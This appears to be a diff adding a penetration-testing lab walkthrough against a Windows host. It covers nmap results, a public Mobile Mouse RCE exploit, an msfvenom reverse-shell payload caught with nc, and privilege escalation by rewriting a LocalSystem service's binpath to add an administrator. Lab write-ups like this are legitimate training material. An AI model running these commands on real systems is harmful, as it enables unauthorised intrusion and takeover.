@@ -1,0 +1,99 @@
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+9099/tcp  open  unknown
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest, Help: 
+|     HTTP/1.0 200 OK 
+|     Server: Mobile Mouse Server 
+|     Content-Type: text/html 
+|     Content-Length: 321
+|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "OSCP" was able to receive your request.</p></BODY></HTML>
+9999/tcp  open  abyss?
+35913/tcp open  unknown
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+$ searchsploit mobile mouse -o
+Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE) | windows/remote/51010.py
+$ searchsploit -m 51010.py
+# need to add sleep(2) for each cmd running, give target machine time to render. In a lab environment, Windows can take a fraction of a second to visually render the Run box. Because the script sends RUN3 instantly, the text gets sent while the computer is still drawing the window. The characters get typed into thin air, and the command is lost.
+
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.178 LPORT=4444 -f exe -o test64.exe
+$ python3 -m http.server 80
+$ python3 51010.py --target 192.168.131.155 --lhost 192.168.45.178 --file test64.exe
+
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.178] from (UNKNOWN) [192.168.131.155] 53939
+Microsoft Windows [Version 10.0.19045.2251]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\Temp>
+# Upload PowerUp.ps1
+PowerUp.ps1
+Invoke-AllChecks
+ServiceName   : GPGOrchestrator
+Path          : "C:\Program Files\MilleGPG5\GPGService.exe"
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -ServiceName 'GPGOrchestrator'
+
+PS C:\temp> icacls "C:\Program Files\MilleGPG5"
+BUILTIN\Users:(OI)(CI)(M)
+PS C:\temp> Get-Service GPGOrchestrator | Select-Object -Property Name, StartType, Status
+Name            StartType  Status
+----            ---------  ------
+GPGOrchestrator Automatic Running
+
+PS C:\temp> sc.exe qc GPGOrchestrator
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: GPGOrchestrator
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\MilleGPG5\GPGService.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : GPG Orchestrator
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+C:\Windows\Temp>sc.exe config GPGOrchestrator binpath= "cmd.exe /c net localgroup administrators tim /add & \"C:\Program Files\MilleGPG5\GPGService.exe\""
+
+C:\Windows\Temp>sc.exe qc GPGOrchestrator
+sc.exe qc GPGOrchestrator
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: GPGOrchestrator
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : cmd.exe /c net localgroup administrators tim /add & "C:\Program Files\MilleGPG5\GPGService.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : GPG Orchestrator
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+PS C:\temp> whoami /priv
+SeShutdownPrivilege
+
+PS C:\temp> shutdown /r /t 0
+
+C:\Users>net localgroup administrators
+Members
+-------------------------------------------------------------------------------
+Administrator
+Tim
+
+# Need UAC Bypass here
+
+
+
+
+
+
